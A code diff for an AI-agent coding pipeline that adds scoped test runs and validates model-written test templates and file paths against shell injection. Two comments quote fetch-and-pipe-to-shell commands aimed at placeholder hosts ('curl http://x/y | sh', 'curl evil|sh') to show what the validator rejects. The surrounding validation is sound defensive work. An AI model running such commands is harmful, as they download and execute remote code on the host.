@@ -46,6 +46,7 @@ const PLAN_SCHEMA = {
           },
         },
         test_command: { type: 'string' },
+        test_command_scoped: { type: 'string' },
         run_command: { type: 'string', description: 'How to start the app; null if not runnable' },
       },
       required: ['stack', 'relevant_files'],
@@ -133,6 +134,15 @@ const CODER_SCHEMA = {
         written: { type: 'array', items: { type: 'string' } },
         updated: { type: 'array', items: { type: 'string' } },
         result: { type: 'string', description: 'e.g. "42 passed, 0 failed"' },
+        scope: { type: 'string', enum: ['scoped', 'full'] },
+        full_suite: {
+          type: 'object',
+          properties: {
+            ran: { type: 'boolean' },
+            command: { type: 'string' },
+            result: { type: 'string' },
+          },
+        },
         pre_existing_failures: { type: 'array', items: { type: 'string' }, description: 'Exactly the entries in tests.baseline.failing that still fail at the end — not recollection' },
         baseline: {
           type: 'object',
@@ -316,9 +326,89 @@ function renderContext(ctx) {
   }
   const cmds = []
   if (ctx.test_command) cmds.push(`- test: \`${ctx.test_command}\``)
+  if (ctx.test_command_scoped) cmds.push(`- test (scoped): \`${ctx.test_command_scoped}\``)
   if (ctx.run_command) cmds.push(`- run: \`${ctx.run_command}\``)
   if (cmds.length) parts.push('### Commands\n' + cmds.join('\n'))
   return parts.join('\n') + '\n\n'
+}
+
+// Every path substituted into a scoped command is filtered HERE, in code,
+// before it reaches a prompt — never by a prose rule telling an agent to skip
+// odd characters, because the strings come from the same class of component
+// the rule would be addressed to (the plan's steps[].files, and the Coder's
+// own tests.written/updated JSON, neither of which is pattern-constrained by
+// its schema). A leading `-` makes a path an option rather than a target, and
+// a `..` segment or a leading `/` points the runner outside the tree — both
+// pass the character class, exactly as safeMigrationsDir's comment describes.
+function safeTestPath(p) {
+  if (typeof p !== 'string') return false
+  const s = p.trim()
+  if (!s || !SAFE_REL_PATH.test(s) || s.startsWith('/') || s.startsWith('-')) return false
+  return !s.split('/').some(seg => seg === '..' || seg.startsWith('-'))
+}
+
+// Returns the safe paths and the rejected ones separately: a silently shorter
+// list means files the pass believed it tested and did not, which is the
+// docs/contracts/code.md "never swallow an error silently" rule applied to a
+// filter rather than to a catch. Every caller logs `dropped`.
+function partitionTestPaths(paths) {
+  const seen = new Set()
+  const safe = []
+  const dropped = []
+  for (const p of paths || []) {
+    const s = typeof p === 'string' ? p.trim() : String(p)
+    if (seen.has(s)) continue
+    seen.add(s)
+    if (safeTestPath(s)) safe.push(s)
+    else dropped.push(s)
+  }
+  return { safe, dropped }
+}
+
+// Single quotes are sound only because safeTestPath already excluded `'` along
+// with every other metacharacter; they are belt-and-braces against a path with
+// a space, which the class also excludes.
+function substituteScopedPaths(template, paths) {
+  return template.replace('{paths}', paths.map(p => `'${p}'`).join(' '))
+}
+
+// The scoped-run instructions for the Coder and the Reviewer. Returns the
+// effective mode alongside the block rather than just a string, because three
+// separate conditions demote a run to the full suite and the caller has to log
+// which one applied: the operator asked for `full`, the Planner supplied no
+// usable template, or every path the plan names failed safeTestPath. That last
+// one matters most — with an empty list `{paths}` substitutes to nothing, and
+// `pytest` with no arguments runs everything (harmless) while `go test` runs
+// only the current package and `cargo test -p` is a no-op, i.e. a near-zero
+// test selection reporting green.
+function renderScopedTests(plan, scopeSetting) {
+  const template = plan?.codebase_context?.test_command_scoped
+  if (scopeSetting !== 'scoped') return { block: '', mode: 'full', reason: `config.tests.scope is '${scopeSetting}'`, dropped: [] }
+  if (!template) return { block: '', mode: 'full', reason: 'the plan carries no usable test_command_scoped', dropped: [] }
+
+  const { safe, dropped } = partitionTestPaths((plan.steps || []).flatMap(s => s.files || []))
+  if (!safe.length) {
+    return { block: '', mode: 'full', reason: 'no file the plan names is safe to substitute into a shell command', dropped }
+  }
+
+  const droppedNote = dropped.length
+    ? `\n\nNOT COVERED by the pre-rendered command: ${dropped.join(', ')} — ${dropped.length} path(s) the plan names cannot be substituted safely. Widen the scope by hand, or run the full suite, before you call those files tested.`
+    : ''
+
+  return {
+    mode: 'scoped',
+    dropped,
+    block: `### Scoped test runs
+This project's tests are scoped by default: run the subset that covers what you touched instead of the whole suite on every step. The template, exactly as validated:
+
+\`${template}\`
+
+Substitute the single \`{paths}\` with a space-separated list of single-quoted paths. Never substitute a path containing anything outside \`[A-Za-z0-9._/-]\`, or one starting with \`-\` or \`/\` — skip it and say so rather than quoting around it. Change nothing else about the command.
+
+Already rendered for the files this plan names, safe to run as-is:
+
+\`${substituteScopedPaths(template, safe)}\`${droppedNote}\n\n`,
+  }
 }
 
 function renderPlan(plan) {
@@ -413,6 +503,74 @@ function renderPriorVerification(verdict, round) {
   return lines.join('\n')
 }
 
+// The Reviewer's revert-and-rerun proof needs a command naming exactly the
+// test files the Coder wrote or updated — and those filenames arrive as
+// CODER_SCHEMA `array of string` with no pattern, straight out of a model's
+// JSON. They are only displayed today; the moment they become shell arguments
+// the Reviewer's prompt is the wrong place to sanitize them, so the fully
+// substituted line is built here and handed over ready to run. Returns '' when
+// scoped mode is off or nothing survives the filter, in which case
+// reviewer.md's existing full-suite instruction stands unchanged.
+function renderScopedRevert(plan, coderResult, mode) {
+  const template = plan?.codebase_context?.test_command_scoped
+  if (mode !== 'scoped' || !template) return { block: '', dropped: [] }
+
+  const { safe, dropped } = partitionTestPaths([...(coderResult?.tests?.written || []), ...(coderResult?.tests?.updated || [])])
+  if (!safe.length) return { block: '', dropped }
+
+  const droppedNote = dropped.length
+    ? `\n${dropped.length} reported test path(s) could not be substituted safely and are NOT in that command: ${dropped.join(', ')}. Treat them as unproven.`
+    : ''
+
+  return {
+    dropped,
+    block: `\n\n### SCOPED COMMAND FOR THE REVERT PROOF\nAlready substituted and validated — run it verbatim, do not rebuild it:\n\n\`${substituteScopedPaths(template, safe)}\`\n\nThat proof only has to watch one test flip red→green, so this is the whole suite it needs.${droppedNote}`,
+  }
+}
+
+// 'never' and 'ship' can only mean what they say when the intermediate runs are
+// narrower than the suite. When scoping didn't take — the operator asked for
+// scope 'full', or the plan carried no usable template — every run already IS
+// the whole suite, so there is nothing to defer or disable, and a 'disabled'
+// status would claim no wide run happened while the baseline and every per-step
+// run were exactly that. README promises scope 'full' restores the previous
+// behaviour exactly; honouring fullSuiteAt there would break that promise by
+// under-reporting coverage the run actually took.
+function effectiveFullSuiteAt(configured, scopedMode) {
+  return scopedMode === 'scoped' ? configured : DEFAULT_FULL_SUITE_AT
+}
+
+// agents/coder.md ends its test section with "run the full suite — unless the
+// prompt says otherwise". This is the otherwise, and without it fullSuiteAt was
+// a label on the result and nothing else: the Coder ran the suite anyway, the
+// status came back 'ran', and 'never' documented a gate that did not exist.
+// Rendered for fix passes too — a fix pass is a pass, and one that runs the
+// whole suite defeats 'never' exactly as thoroughly as the first one would.
+const FULL_SUITE_DIRECTIVES = {
+  ship: 'This project defers the full suite to ship time (`config.tests.fullSuiteAt: "ship"`) — `/ldo-ship` runs it before the PR merges.',
+  never: 'This project never runs the full suite inside the pipeline (`config.tests.fullSuiteAt: "never"`) — the operator owns that gate.',
+}
+
+// Rendered for the Reviewer as well as the Coder: the Reviewer runs the plan's
+// test_command to drive criteria, and a Reviewer running the whole suite under
+// 'never' costs the same wall-clock the setting exists to avoid. Its instruction
+// differs — it has no tests.full_suite field to fill, and it must not silently
+// downgrade a criterion it can no longer prove.
+const FULL_SUITE_ROLE_INSTRUCTIONS = {
+  coder: 'Do NOT run it at the end of your pass — use the scoped command for the baseline, for every per-step run, and for your final comparison. Report `tests.full_suite` as `{ "ran": false, "command": "", "result": "" }` and say why in `deviations`; never guess a result to fill the field. Nothing else about your process changes — you still capture a baseline, still distinguish your failures from pre-existing ones, still run the scoped suite after each step.',
+  reviewer: 'Do NOT run the unscoped `test_command` — use the scoped command for the revert proof and for any criterion you drive through tests. If a criterion genuinely cannot be proven without the whole suite, mark it `skipped` with that as the reason rather than running it or claiming it passed; a skipped criterion is reported as NOT PROVEN, which is the honest outcome here.',
+}
+
+function renderFullSuiteDirective(fullSuiteAt, role) {
+  const why = FULL_SUITE_DIRECTIVES[fullSuiteAt]
+  const how = FULL_SUITE_ROLE_INSTRUCTIONS[role]
+  if (!why || !how) return ''
+  return `### Do not run the full suite
+${why} ${how}
+
+`
+}
+
 function renderCoderSummary(r) {
   if (!r) return '(No summary)'
   if (typeof r === 'string') return r
@@ -486,6 +644,68 @@ function safeMigrationsDir(dir) {
   if (segments.includes('..')) return null
   if (segments.some(seg => seg.startsWith('.') || seg.startsWith('-'))) return null
   return normalized
+}
+
+// codebase_context.test_command_scoped is Planner-authored text that the Coder
+// and the Reviewer substitute into a Bash line, so it gets the same
+// validated-once-then-never-re-trusted treatment as migrations.directory above,
+// with two extra failure modes of its own. First, a template missing the
+// {paths} placeholder — or carrying two — runs the wrong set of tests and
+// reports green, which is worse than running everything: `pytest` with no
+// placeholder silently becomes the full suite, and `go test` with none runs
+// only the current package. Second, argv[0] decides what actually executes;
+// a character class alone constrains the arguments but not the program, and
+// `curl http://x/y | sh` fails the class only by accident of the pipe. So the
+// runner is checked against a known set, or against the first token of the
+// test_command this run already derived — scoping may narrow a command the
+// pipeline was going to invoke, not introduce a new one.
+const SCOPED_TEMPLATE_MAX = 200
+// No shell metacharacter is in this class — no `;` `&` `|` `$` backtick `<`
+// `>` `(` `)` `*` `?` `'` `"` `\` and no newline — so a substituted path
+// cannot terminate the command and start another. No `m` flag, deliberately:
+// with it, `$` would anchor at a line break and `pytest {paths}\ncurl evil|sh`
+// would pass. The class also excludes `{`, so neither `[...]*` can cross the
+// placeholder and the match stays linear.
+const SCOPED_TEMPLATE_SHAPE = /^[A-Za-z0-9 ._\/,:=+@-]*\{paths\}[A-Za-z0-9 ._\/,:=+@-]*$/
+const SCOPED_RUNNERS = ['npm', 'npx', 'yarn', 'pnpm', 'pytest', 'python', 'python3', 'go', 'cargo', 'mvn', 'gradle', 'dotnet', 'rspec', 'bundle', 'phpunit', 'jest', 'vitest', 'ctest', 'make', 'tox', 'deno', 'bun', 'node']
+
+function safeScopedTemplate(t, testCommand) {
+  if (typeof t !== 'string') return null
+  // Checked on the raw value, before trim: trim() would repair `pytest
+  // {paths}\n` into an accept, and a template arriving with a line break in it
+  // was pasted from a file or from command output rather than authored as one
+  // command. Repairing that guesses which half was meant.
+  if (/[\r\n]/.test(t)) return null
+  const s = t.trim()
+  // Length before the regex: a pathological input is then rejected by a
+  // comparison rather than by a scan.
+  if (!s || s.length > SCOPED_TEMPLATE_MAX) return null
+  if (!SCOPED_TEMPLATE_SHAPE.test(s)) return null
+  if (s.split('{paths}').length !== 2) return null
+  const tokens = s.split(/ +/).filter(Boolean)
+  // An absolute or relative path as argv[0] runs a program from the repo (or
+  // from anywhere); as a later argument it points the runner at a target
+  // nobody chose. Same segment-level rejection as safeMigrationsDir, and for
+  // the same reason: the character class calls `.git/hooks` well-formed.
+  if (tokens.some(tok => tok !== '{paths}' && (tok.startsWith('/') || tok.startsWith('.')))) return null
+  const runner = tokens[0]
+  const baseRunner = String(testCommand || '').trim().split(/ +/)[0]
+  if (!SCOPED_RUNNERS.includes(runner) && runner !== baseRunner) return null
+  return s
+}
+
+// Rejected values are by definition the ones holding metacharacters, newlines
+// or arbitrary length — a raw interpolation lets one forge extra lines in the
+// run journal, and a command line scraped from a config file can carry a
+// token. Same treatment the stallMs rejection already gives its value.
+// Must be total over anything a JSON-parsed (or recovered) plan can hold:
+// JSON.stringify returns the VALUE undefined — not a string — for undefined, a
+// function or a symbol, and every call site here is a log line on a rejection
+// path, i.e. exactly where a TypeError would replace a degraded-but-running
+// feature with a dead one.
+function quoteRejected(value) {
+  const s = JSON.stringify(value) ?? String(value)
+  return s.length > 120 ? `${s.slice(0, 119)}…` : s
 }
 
 // A recovered plan (args.resumePlan) reaches renderPlan and every downstream
@@ -834,6 +1054,43 @@ function markUnproven(verdict) {
   }
 }
 
+// Scoped runs mean an approved verdict can rest on nothing wider than the
+// files this run touched, and `approved: true` alone cannot express that. An
+// enum rather than a boolean for the same reason record_status is one:
+// `full_suite: false` is satisfied identically by a crashed Coder, by a
+// deliberate fullSuiteAt 'never', and by a run that deferred to ship, and
+// those are three different facts to whoever reads the result.
+// Reference-identical on the 'ran' path, like enforceVerificationGate and
+// enforceMigrationGate: call sites detect a gate firing by identity, so an
+// unconditional spread here would read as "fired" on every clean run.
+// This annotates and never blocks — the point is a fact carried honestly, not
+// a fourth gate.
+const FULL_SUITE_REASONS = {
+  not_run: 'no Coder pass reported running it',
+  disabled: "config.tests.fullSuiteAt is 'never' — the operator owns this gate",
+  deferred_to_ship: "config.tests.fullSuiteAt is 'ship' — /ldo-ship must run it before merge",
+}
+
+function markFullSuite(verdict, status) {
+  if (status === 'ran') return verdict
+  const reason = FULL_SUITE_REASONS[status] || status
+  return {
+    ...verdict,
+    full_suite: status,
+    summary: `${verdict.summary}\n\nFULL SUITE NOT RUN — ${reason}; only the files this run touched were tested, so a cross-module regression could not have been caught.`,
+  }
+}
+
+// `ran: true` is a model reporting on its own behaviour, and markUnproven
+// exists because that is exactly what a model is least reliable at. Corroborate
+// it: a pass that genuinely ran the suite has a command and a result to show
+// for it, and a claim with neither is downgraded to not_run.
+function fullSuiteRan(tests) {
+  const fs = tests?.full_suite
+  if (!fs || fs.ran !== true) return false
+  return typeof fs.command === 'string' && fs.command.trim() !== '' && typeof fs.result === 'string' && fs.result.trim() !== ''
+}
+
 // An issue's identity is the file it names plus the Reviewer's prose describing
 // it, and that prose is model-authored free text. Run wf_2b451aee-6ea re-raised
 // the same critical on its fix pass in different words, the verbatim key missed,
@@ -1164,6 +1421,37 @@ for (const key of Object.keys(PLANNER_CONFIG)) {
   if (!['maxStepsPerRun', 'preferSplit'].includes(key)) log(`⚠ config.planner.${key} is not a known key — ignored. Keys: maxStepsPerRun, preferSplit`)
 }
 
+// A single run used to execute the full suite 5-8 times: the Coder's baseline,
+// its per-step runs and its end-of-pass run, the Reviewer's own run, and the
+// two runs the revert-and-rerun proof needs to watch one test flip — all of it
+// again on every fix round, up to MAX_FIX_LOOPS.
+// The default is `scoped` rather than opt-in because a cost cut nobody hears
+// about reaches nobody, and it is only defensible as a default because two
+// other things hold: fullSuiteAt 'final-pass' still runs the whole suite once
+// at the end of each Coder pass, and markFullSuite makes a run that never ran
+// it say so on the result instead of returning a bare `approved: true`. Change
+// either of those and scoped-by-default stops being safe.
+const TESTS_CONFIG = CONFIG.tests || {}
+const TEST_SCOPES = ['scoped', 'full']
+const FULL_SUITE_POINTS = ['final-pass', 'ship', 'never']
+const DEFAULT_TEST_SCOPE = 'scoped'
+const DEFAULT_FULL_SUITE_AT = 'final-pass'
+let TEST_SCOPE = DEFAULT_TEST_SCOPE
+if (TESTS_CONFIG.scope !== undefined) {
+  if (TEST_SCOPES.includes(TESTS_CONFIG.scope)) TEST_SCOPE = TESTS_CONFIG.scope
+  else log(`⚠ config.tests.scope is invalid (${JSON.stringify(TESTS_CONFIG.scope)}) — expected ${TEST_SCOPES.join('|')}. Keeping default ${DEFAULT_TEST_SCOPE}`)
+}
+let FULL_SUITE_AT = DEFAULT_FULL_SUITE_AT
+if (TESTS_CONFIG.fullSuiteAt !== undefined) {
+  if (FULL_SUITE_POINTS.includes(TESTS_CONFIG.fullSuiteAt)) FULL_SUITE_AT = TESTS_CONFIG.fullSuiteAt
+  else log(`⚠ config.tests.fullSuiteAt is invalid (${JSON.stringify(TESTS_CONFIG.fullSuiteAt)}) — expected ${FULL_SUITE_POINTS.join('|')}. Keeping default ${DEFAULT_FULL_SUITE_AT}`)
+}
+// Same reason as the planner and stallMs key loops: a value guard catches half
+// the mistake, and the operator believes a setting took effect either way.
+for (const key of Object.keys(TESTS_CONFIG)) {
+  if (!['scope', 'fullSuiteAt'].includes(key)) log(`⚠ config.tests.${key} is not a known key — ignored. Keys: scope, fullSuiteAt`)
+}
+
 // Merged once at module scope, not per routeModels() call: routeModels runs
 // twice per feature and N times in a multi-feature run, so warning inside it
 // would repeat the operator's typo once per call. The cost is a temporal
@@ -1360,8 +1648,19 @@ async function phasePlan(task, ctx, researchReport, logStage, logPrefix) {
   // originates in pasted task text, not the operator's own keyboard, and it
   // reaches a shell command downstream in the Reviewer's hands.
   if (plan.migrations?.count > 0 && !safeMigrationsDir(plan.migrations.directory)) {
-    log(`${logPrefix}⚠ Rejected migrations.directory as unsafe: '${plan.migrations.directory}' — migration gate disabled for this run.`)
+    log(`${logPrefix}⚠ Rejected migrations.directory as unsafe: ${quoteRejected(plan.migrations.directory)} — migration gate disabled for this run.`)
     delete plan.migrations
+  }
+
+  // Same reason, same place: validated here so no downstream renderer ever
+  // re-checks it, and deleted rather than nulled so nothing can re-trust it.
+  if (plan.codebase_context?.test_command_scoped !== undefined) {
+    const scoped = safeScopedTemplate(plan.codebase_context.test_command_scoped, plan.codebase_context.test_command)
+    if (scoped) plan.codebase_context.test_command_scoped = scoped
+    else {
+      log(`${logPrefix}⚠ Rejected test_command_scoped as unsafe: ${quoteRejected(plan.codebase_context.test_command_scoped)} — scoped test runs disabled for this run, the full suite will be used.`)
+      delete plan.codebase_context.test_command_scoped
+    }
   }
 
   // test_command/run_command are the one field on the plan whose entire
@@ -1373,11 +1672,39 @@ async function phasePlan(task, ctx, researchReport, logStage, logPrefix) {
   // and to find the command itself if the plan doesn't name one. So this
   // costs one rediscovery and closes the only route a resumed plan has to a
   // shell.
-  if (planFromResume && plan.codebase_context && (plan.codebase_context.test_command || plan.codebase_context.run_command)) {
-    delete plan.codebase_context.test_command
-    delete plan.codebase_context.run_command
-    log(`${logPrefix}⚠ resumePlan: dropped test_command/run_command — a recovered command string is executed by the Coder and cannot be verified from a dead run; the Coder will rediscover them.`)
+  // Unconditional over the three fields rather than guarded on any one of
+  // them being present: a guard keyed on sibling fields lets a recovered plan
+  // carrying ONLY test_command_scoped skip the block entirely, and that
+  // template is rendered into both the Coder and the Reviewer prompt for
+  // execution. The log fires only when something was actually removed, so a
+  // resume of a plan that never had them stays quiet.
+  if (planFromResume && plan.codebase_context) {
+    const dropped = ['test_command', 'test_command_scoped', 'run_command'].filter(f => plan.codebase_context[f] !== undefined)
+    dropped.forEach(f => delete plan.codebase_context[f])
+    if (dropped.length) log(`${logPrefix}⚠ resumePlan: dropped ${dropped.join('/')} — a recovered command string is executed by the Coder and cannot be verified from a dead run; the Coder will rediscover them.`)
   }
+
+  // Computed once, here, so the Coder and the Reviewer are told the same
+  // thing: a run where one scoped and the other ran everything produces a
+  // baseline and a final comparison at different widths, which manufactures
+  // phantom entries in pre_existing_failures.
+  const scopedTests = renderScopedTests(plan, TEST_SCOPE)
+  if (scopedTests.mode === 'scoped') log(`${logPrefix}Tests: scoped runs enabled (${plan.codebase_context.test_command_scoped})`)
+  else log(`${logPrefix}Tests: full-suite mode — ${scopedTests.reason}`)
+  if (scopedTests.dropped.length) {
+    log(`${logPrefix}  ⚠ ${scopedTests.dropped.length} path(s) excluded from scoped test selection (unsupported characters): ${scopedTests.dropped.join(', ')} — those files were not covered by the scoped runs`)
+  }
+  // Resolved once, beside the mode it depends on, and carried on the same
+  // object: deriving it separately at the two places that need it (the Coder's
+  // prompt and the result's status) is how a run tells the Coder to skip the
+  // suite and then reports 'not_run' as though the Coder had simply not run it.
+  const fullSuiteAt = effectiveFullSuiteAt(FULL_SUITE_AT, scopedTests.mode)
+  if (fullSuiteAt !== FULL_SUITE_AT) {
+    log(`${logPrefix}  config.tests.fullSuiteAt '${FULL_SUITE_AT}' does not apply under full-suite mode — every run is already the whole suite. Using '${fullSuiteAt}'.`)
+  } else if (fullSuiteAt !== DEFAULT_FULL_SUITE_AT) {
+    log(`${logPrefix}  Full suite: ${fullSuiteAt === 'never' ? 'not run anywhere in the pipeline' : 'deferred to /ldo-ship'} (config.tests.fullSuiteAt: '${fullSuiteAt}') — the Coder is told not to run it.`)
+  }
+  scopedTests.fullSuiteAt = fullSuiteAt
 
   const models = routeModels(plan.complexity)
   const CTX = renderContext(plan.codebase_context)
@@ -1416,7 +1743,7 @@ async function phasePlan(task, ctx, researchReport, logStage, logPrefix) {
     log(`${logPrefix}Migrations: ${plan.migrations.count} in ${plan.migrations.directory} — ${(plan.migrations.identifiers || []).join(', ') || '(no identifiers listed)'}`)
   }
 
-  return { plan, models, CTX, surface, DO_SECURITY, WORKTREE_BLOCK }
+  return { plan, models, CTX, surface, DO_SECURITY, WORKTREE_BLOCK, scopedTests }
 }
 
 // ── phaseSecurity ──────────────────────────
@@ -1451,8 +1778,11 @@ async function phaseSecurity(plan, models, ctx, WORKTREE_BLOCK, CTX, DO_SECURITY
 
 // ── phaseCodeReview ────────────────────────
 
-async function phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_BLOCK, task, logStage, logPrefix) {
+async function phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_BLOCK, task, logStage, logPrefix, scopedTests) {
   let iteration = 0
+  // Sticky across passes: the question the result answers is whether the full
+  // suite ran at any point in this run, not whether the last fix pass ran it.
+  let fullSuiteRanOnce = false
   let reviewIssues = []
   let finalVerdict = null
   let lastVerdict = null
@@ -1484,9 +1814,16 @@ async function phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_
     // Fix passes stay narrow — only the flagged files, not a re-review of the
     // whole surface — because re-attacking everything on every loop would
     // triple the cost of a multi-round fix for no proportional benefit.
+    // Both branches, not only the first: a fix pass is a pass, and one that runs
+    // the whole suite at the end costs exactly what the first one would and
+    // defeats fullSuiteAt 'never' just as completely. The scoped block goes with
+    // it because the directive tells the Coder to use "the scoped command" —
+    // without the block naming it, that sentence points at nothing.
+    const TESTS_BLOCK = (scopedTests?.block || '') + renderFullSuiteDirective(scopedTests?.fullSuiteAt, 'coder')
+
     const coderPrompt = isFirstPass
-      ? WORKTREE_BLOCK + CTX + SECURITY_BLOCK + `Set up the environment, then execute this plan. The PROJECT CONTEXT above is your map — don't re-scan the repo.\n\n${renderPlan(plan)}`
-      : WORKTREE_BLOCK + `Fix the review issues below. Narrow pass — touch only these files. Don't leave a comment narrating the fix ("changed X to Y because the reviewer flagged Z") — the why belongs in your summary, not in the code.\n\n## ISSUES\n${reviewIssues.map((iss, i) => `${i + 1}. [${iss.severity}] ${iss.file}: ${iss.what}\n   → ${iss.suggestion}`).join('\n\n')}\n\n## PLAN (context)\n${renderPlanCompact(plan)}${renderConstraints(plan)}`
+      ? WORKTREE_BLOCK + CTX + SECURITY_BLOCK + TESTS_BLOCK + `Set up the environment, then execute this plan. The PROJECT CONTEXT above is your map — don't re-scan the repo.\n\n${renderPlan(plan)}`
+      : WORKTREE_BLOCK + TESTS_BLOCK + `Fix the review issues below. Narrow pass — touch only these files. Don't leave a comment narrating the fix ("changed X to Y because the reviewer flagged Z") — the why belongs in your summary, not in the code.\n\n## ISSUES\n${reviewIssues.map((iss, i) => `${i + 1}. [${iss.severity}] ${iss.file}: ${iss.what}\n   → ${iss.suggestion}`).join('\n\n')}\n\n## PLAN (context)\n${renderPlanCompact(plan)}${renderConstraints(plan)}`
 
     const coderLabel = isFirstPass ? 'coder' : `coder-fix-${iteration}`
     const coderResult = await runAgent(coderPrompt, {
@@ -1507,12 +1844,29 @@ async function phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_
     if (isFirstPass && !coderResult?.tests?.baseline?.captured) {
       log(`${logPrefix}⚠ No test baseline captured before the first edit — pre-existing failures are unattributable`)
     }
+    if (fullSuiteRan(coderResult?.tests)) {
+      fullSuiteRanOnce = true
+      // The command is logged, not just the fact: a scoped line reported as
+      // the full suite is only visible if the journal carries what actually
+      // ran, and comparing it against the plan's own test_command is
+      // something the operator can do afterwards from this line alone.
+      log(`${logPrefix}Full suite (pass ${iteration + 1}): \`${coderResult.tests.full_suite.command}\` — ${coderResult.tests.full_suite.result}`)
+    } else if (coderResult?.tests?.full_suite?.ran === true) {
+      log(`${logPrefix}⚠ Coder pass ${iteration + 1} reported the full suite as run but gave no command and/or no result — counting it as not run`)
+    }
 
     logStage('Review')
 
+    const scopedRevert = renderScopedRevert(plan, coderResult, scopedTests?.mode)
+    if (scopedRevert.dropped.length) {
+      log(`${logPrefix}  ⚠ ${scopedRevert.dropped.length} reported test path(s) excluded from the Reviewer's scoped command (unsupported characters): ${scopedRevert.dropped.join(', ')}`)
+    }
+
+    const REVIEW_TESTS_BLOCK = (scopedTests?.block || '') + renderFullSuiteDirective(scopedTests?.fullSuiteAt, 'reviewer')
+
     const reviewerPrompt = isFirstPass
-      ? WORKTREE_BLOCK + CTX + SECURITY_BLOCK + `Review this implementation against the plan, drive the app to prove the acceptance criteria, then try to break it.\n\n${renderPlan(plan)}\n\n## CODER'S SUMMARY\n${renderCoderSummary(coderResult)}`
-      : WORKTREE_BLOCK + `Verify these fixes landed, and scan for new problems introduced by them. Re-run every attack marked \`broke\` and every criterion marked \`failed\` or \`skipped\` in the block below; don't re-run the ones marked \`held\` or \`passed\` unless this fix plausibly touched them. Check the new code for archaeology comments too — a line explaining what the fix changed and why is history, not a constraint; flag it the same as dead code.\n\n## ISSUES TO VERIFY\n${reviewIssues.map((iss, i) => `${i + 1}. [${iss.severity}] ${iss.file}: ${iss.what}`).join('\n')}\n\n## CODER'S FIX SUMMARY\n${renderCoderSummary(coderResult)}\n\n## PLAN (context)\n${renderPlanCompact(plan)}${renderConstraints(plan)}${renderMigrations(plan)}${renderPriorVerification(lastVerdict, iteration)}`
+      ? WORKTREE_BLOCK + CTX + SECURITY_BLOCK + REVIEW_TESTS_BLOCK + `Review this implementation against the plan, drive the app to prove the acceptance criteria, then try to break it.\n\n${renderPlan(plan)}\n\n## CODER'S SUMMARY\n${renderCoderSummary(coderResult)}${scopedRevert.block}`
+      : WORKTREE_BLOCK + REVIEW_TESTS_BLOCK + `Verify these fixes landed, and scan for new problems introduced by them. Re-run every attack marked \`broke\` and every criterion marked \`failed\` or \`skipped\` in the block below; don't re-run the ones marked \`held\` or \`passed\` unless this fix plausibly touched them. Check the new code for archaeology comments too — a line explaining what the fix changed and why is history, not a constraint; flag it the same as dead code.\n\n## ISSUES TO VERIFY\n${reviewIssues.map((iss, i) => `${i + 1}. [${iss.severity}] ${iss.file}: ${iss.what}`).join('\n')}\n\n## CODER'S FIX SUMMARY\n${renderCoderSummary(coderResult)}${scopedRevert.block}\n\n## PLAN (context)\n${renderPlanCompact(plan)}${renderConstraints(plan)}${renderMigrations(plan)}${renderPriorVerification(lastVerdict, iteration)}`
 
     const reviewerLabel = isFirstPass ? 'reviewer' : `reviewer-${iteration}`
     // `|| models.reviewer` is defensive, not load-bearing: mergeModelTable
@@ -1706,7 +2060,7 @@ async function phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_
     logUnproven(finalVerdict, logPrefix)
   }
 
-  return { finalVerdict, iteration, downgraded: lastDowngraded }
+  return { finalVerdict, iteration, downgraded: lastDowngraded, fullSuiteRan: fullSuiteRanOnce }
 }
 
 // ── phaseRecord ────────────────────────────
@@ -1842,9 +2196,15 @@ ${securityReport?.status === 'findings' ? securityReport.findings.map(f => `[${f
 
 // approved leads the object — a caller checking the run's outcome shouldn't
 // have to dig past everything else to find it.
-function shapeResult(approved, plan, researchReport, securityReport, finalVerdict, surface, models, iteration, task, ctx, recordMisplaced, recordStatus) {
+function shapeResult(approved, plan, researchReport, securityReport, finalVerdict, surface, models, iteration, task, ctx, recordMisplaced, recordStatus, fullSuiteStatus, testScope) {
   return {
     approved,
+    // Sits beside approved, not in stats, because it qualifies approved: under
+    // scoped runs `approved: true` can rest on nothing wider than the files
+    // this run touched. 'ran' | 'not_run' | 'disabled' | 'deferred_to_ship' —
+    // see markFullSuite for why this is an enum and not a boolean.
+    full_suite_status: fullSuiteStatus || 'not_run',
+    test_scope: testScope || 'full',
     // `record_misplaced: false` cannot express "the Recorder died and wrote
     // nothing" — the failure path satisfies it trivially, so a crashed Record
     // phase used to be indistinguishable from a clean one in this object. A
@@ -1943,7 +2303,7 @@ async function runOneFeature(task, ctx) {
     // Phase 2: Plan
     const planResult = await phasePlan(task, ctx, researchReport, logStage, logPrefix)
     if (planResult.error) return planResult
-    const { plan, models, CTX, surface, DO_SECURITY, WORKTREE_BLOCK } = planResult
+    const { plan, models, CTX, surface, DO_SECURITY, WORKTREE_BLOCK, scopedTests } = planResult
 
     // Phase 3: Security
     const { securityReport, SECURITY_BLOCK } = await phaseSecurity(plan, models, ctx, WORKTREE_BLOCK, CTX, DO_SECURITY, logStage, logPrefix)
@@ -1956,9 +2316,28 @@ async function runOneFeature(task, ctx) {
     }
 
     // Phase 4: Code + Review
-    const reviewResult = await phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_BLOCK, task, logStage, logPrefix)
+    const reviewResult = await phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_BLOCK, task, logStage, logPrefix, scopedTests)
     if (reviewResult.error) return reviewResult
-    const { finalVerdict, iteration, downgraded } = reviewResult
+    const { finalVerdict: rawFinalVerdict, iteration, downgraded } = reviewResult
+
+    // 'ran' outranks the configured intent: a Coder that ran the whole suite
+    // under fullSuiteAt 'never' still ran it, and the status describes what
+    // happened, not what was asked for.
+    // The EFFECTIVE setting, not the configured one: under full-suite mode the
+    // Coder was never told to skip anything, so reporting 'disabled' there would
+    // describe an instruction that was never sent.
+    const effectiveAt = scopedTests?.fullSuiteAt || DEFAULT_FULL_SUITE_AT
+    const fullSuiteStatus = reviewResult.fullSuiteRan
+      ? 'ran'
+      : effectiveAt === 'never' ? 'disabled'
+      : effectiveAt === 'ship' ? 'deferred_to_ship'
+      : 'not_run'
+    // Applied BEFORE phaseRecord so the review report the Recorder writes
+    // carries the sentence too, rather than only the returned object.
+    const finalVerdict = markFullSuite(rawFinalVerdict, fullSuiteStatus)
